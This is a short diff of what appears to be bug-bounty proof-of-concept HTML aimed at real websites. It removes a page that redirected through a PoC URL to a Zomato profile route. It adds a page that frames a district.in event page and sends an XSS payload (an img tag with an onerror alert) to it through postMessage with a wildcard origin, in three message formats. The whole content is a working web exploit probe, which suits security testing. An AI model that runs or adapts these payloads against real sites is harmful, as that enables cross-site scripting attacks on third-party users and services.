@@ -1,5 +1,9 @@
-<html><body>
-<script>
-  window.location = "https://meme-bb.github.io/poc.html?action=zpl_redirect&redirect_url=https://www.zomato.com/webroutes/getPage?page_url=/profile";
-</script>
-</body></html>
+ <iframe id='t' src='https://www.district.in/events/list-your-event'></iframe>
+  │    <script>
+  │      document.getElementById('t').onload = function() {
+  │        var pl = '<img src=x onerror=alert(document.domain)>';
+  │        frames[0].postMessage(pl, '*');
+  │        frames[0].postMessage({data:pl}, '*');
+  │        frames[0].postMessage({html:pl}, '*');
+  │      };
+  │    </script>
